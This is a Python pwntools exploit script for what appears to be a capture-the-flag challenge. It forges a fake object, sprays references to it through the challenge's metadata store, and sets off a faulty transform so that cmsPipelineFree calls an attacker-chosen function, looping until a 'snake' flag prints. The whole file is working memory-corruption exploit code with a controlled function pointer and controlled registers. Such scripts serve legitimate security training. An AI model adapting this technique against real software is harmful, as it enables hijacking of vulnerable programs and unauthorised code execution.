#!/usr/bin/env python3
# Authors: Alessandro Zanatta, Gianluca Zavan

from operator import sub
from sys import excepthook
from pwn import *
from pwnlib.gdb import Gdb
import os
import subprocess
import logging


USER = "user"
HOST = args.HOST
PORT = args.PORT
PASSWORD = "password"


exe = ELF("./chall.elf")
# context.binary = exe
context.log_level = "debug"
context.terminal = ['kitty', '-e']
io : remote | None = None


def conn(*a, **kw):
    if args.LOCAL:
        return process(["python", exe], **kw)
    elif args.GDB:
        io = remote(HOST, PORT, **kw)
        sleep(2)
        subprocess.Popen(["./debug.sh"])
        return io
    elif args.SSH:
        return ssh(USER, HOST, PORT, PASSWORD).process(**kw)
    else:
        io = remote(HOST, PORT, ssl=args.SSL, **kw)
        if args.TEAM_TOKEN:
            io.sendlineafter(b"token: ", args.TEAM_TOKEN.encode())
        return io


# Add functions below here, if needed

def create_transform(input_profile, output_profile, input_mode, output_mode):
    global io
    io.sendlineafter(b"Exit\n> ", b"6")
    io.sendlineafter(b"> ", str(input_profile).encode())
    io.sendlineafter(b"> ", str(output_profile).encode())
    io.sendlineafter(b"Input mode: ", input_mode)
    io.sendlineafter(b"Output mode: ", output_mode)

def apply_transform():
    global io
    io.sendlineafter(b"Exit\n> ", b"7")

def store_metadata(data):
    global io
    io.sendlineafter(b"Exit\n> ", b"8")
    io.sendlineafter(b"Data: ", data)
    io.recvuntil(b"Metadata reference: ")
    ref = io.recvline().strip()
    ref = int(ref, 16)
    return ref

def get_metadata(ref):
    global io
    io.sendlineafter(b"Exit\n> ", b"9")
    io.sendlineafter(b"Metadata reference: ", hex(ref).encode())
    data = io.recvline()
    return data


def exit():
    global io
    io.sendlineafter(b"Exit\n> ", b"12")

def payload(func_addr=b"FFFFFFFF", rdi=b"HHHHHHHH", rsi=b"CCCCCCCC"):
    fake_obj = b""

    fake_obj += b"\x00"*8 # to exit the for loop in cmsPipelineFree with no error

    fake_obj += b"B"*8

    # Addr of this gets loaded into RSI
    fake_obj += rsi

    fake_obj += b"D"*8

    fake_obj += b"E"*8
    # Addr of function to call at the end of cmsPipelineFree
    fake_obj += func_addr

    fake_obj += b"G"*8

    # addr of this gets loaded to rdi
    fake_obj += rdi

    fake_obj += b"I"*8

    fake_obj += b"L"*8
    fake_obj += b"M"*8

    fake_obj += b"N"*8
    fake_obj += b"O"*8
    fake_obj += b"P"*24
    fake_obj += b"Q"*24
    fake_obj += b"R"*8
    fake_obj += b"S"*4
    fake_obj += b"T"*8
    fake_obj += b"U"*4
    fake_obj += b"V"*8
    fake_obj += b"W"*8
    fake_obj += b"X"*8
    fake_obj += b"Y"*8
    fake_obj += b"B"*8
    fake_obj += b"B"*4
    fake_obj += b"B"*4

    return fake_obj

def main():
    global io
    loading_state = ['\\', '-', '/', '-']

    """
    Idea: use memcpy to store stuff into one of the addresses that are provided,
    then call get_metadata and read the libc leak (6 bytes b/c 6 is already loaded into rdx)
    """
    # good luck pwning :)
    if args.LOG:
        logging.basicConfig(level=logging.INFO)

    win = False
    try_ = 1
    while not win:
        logging.info(f"Try {try_}")
        try_ += 1
        try:
            io = conn(level="error")

            if args.TOKEN:
                io.sendlineafter(b"enter your team token: ", args.TOKEN.encode())

            offset = 32 # Actual fake data starts from id(fake_obj) + offset

            fake_obj = payload(p64(exe.symbols['__pyx_pw_5chall_3win']))
            ref = store_metadata(fake_obj)

            # print("obj addr: ", hex(ref+offset))
            n = 500
            for i in range(n):
                store_metadata((ref + offset).to_bytes(8, 'little')*(10+i))
                logging.info(f"{i+1}/{n}".ljust(20, " ") + "\r")

            mode_in = b"x"*8
            mode_out = b"y"*8 + b"\x10"
            create_transform(3,3, mode_in, mode_out)

            # This fails and triggers cmsDeleteTransform that executes memcpy
            exit()
        except EOFError:
            io.close()
            logging.info(f"EOFError")
            time.sleep(1)
            continue

        try:
            out = io.recvall()
            if b"snake" in out:
                win = True
                flag_start = out.index(b"snake")
                flag_end = out.index(b"}")
                print(out[flag_start:flag_end+1].decode())
        except EOFError:
            pass
        finally:
            logging.info("Restarting...")
            io.close()



if __name__ == "__main__":
    main()
